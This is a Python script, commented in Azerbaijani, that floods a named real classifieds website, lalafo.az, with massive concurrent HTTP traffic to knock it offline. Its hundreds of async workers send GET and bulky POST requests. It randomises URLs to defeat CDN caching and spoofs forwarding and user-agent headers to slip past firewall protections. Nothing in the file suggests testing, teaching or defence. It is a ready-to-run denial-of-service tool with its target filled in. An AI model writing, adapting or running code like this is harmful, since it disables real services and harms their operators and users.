import asyncio
import httpx
import random
import string
import time
import os

# --- EXTREME CONFIG ---
TARGET_URL = "https://lalafo.az/"
WORKERS = 180           # Railway Paid üçün maksimuma yaxın
BATCH_SIZE = 80         # Hər dalğada göndərilən asinxron paket sayı
CONNECTION_LIMIT = 5000 # Eyni anda açıq qalan TCP bağlantıları

def random_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def get_extreme_headers():
    ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,126)}.0.0.0 Safari/537.36"
    return {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9,az;q=0.8",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Expires": "0",
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "X-Forwarded-Host": f"{random_string(5)}.google.com",
        "X-Real-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        "Service-Worker-Navigation-Preload": "true",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "keep-alive"
    }

async def extreme_flood(client, worker_id):
    while True:
        try:
            # 1. URL Randomization (CDN Cache Bypass)
            # Saytın daxili axtarış və ağır dinamik səhifələrinə fokuslanırıq
            url = f"{TARGET_URL}/?{random_string(6)}={random_string(15)}&s={random_string(20)}"
            
            tasks = []
            for _ in range(BATCH_SIZE):
                headers = get_extreme_headers()
                
                # 2. Vector A: Large Data POST (Server RAM/CPU Exhaustion)
                if _ % 4 == 0:
                    payload = {random_string(5): random_string(100) for _ in range(20)}
                    tasks.append(client.post(url, headers=headers, data=payload, timeout=5))
                
                # 3. Vector B: Header Fuzzing GET (WAF/Cloudflare Bypass)
                else:
                    tasks.append(client.get(url, headers=headers, timeout=5))

            # Bütün asinxron sorğuları eyni anda partlat (Rapid Reset Effect)
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Dinamik gözləmə (Serverin özünə gəlməsinə imkan verməyən sürət)
            await asyncio.sleep(0.001)

        except Exception:
            await asyncio.sleep(0.5)

async def main():
    print(f"💀 DEVASTATOR MODE ACTIVATED ON: {TARGET_URL}")
    print("[!] Warning: This script uses maximum network bandwidth.")
    
    # Maksimum bağlantıya icazə verən TCP Konfiqurasiyası
    limits = httpx.Limits(
        max_connections=CONNECTION_LIMIT, 
        max_keepalive_connections=CONNECTION_LIMIT // 2,
        keepalive_expiry=30.0
    )
    
    async with httpx.AsyncClient(
        http2=True, 
        verify=False, 
        limits=limits,
        headers={"Alt-Svc": 'h3=":443"; ma=86400'} # HTTP/3 dəstəyi təqlidi
    ) as client:
        
        workers = [extreme_flood(client, i) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    # Performance üçün yüngül tənzimləmə
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n[!] Attack halted by operator.")
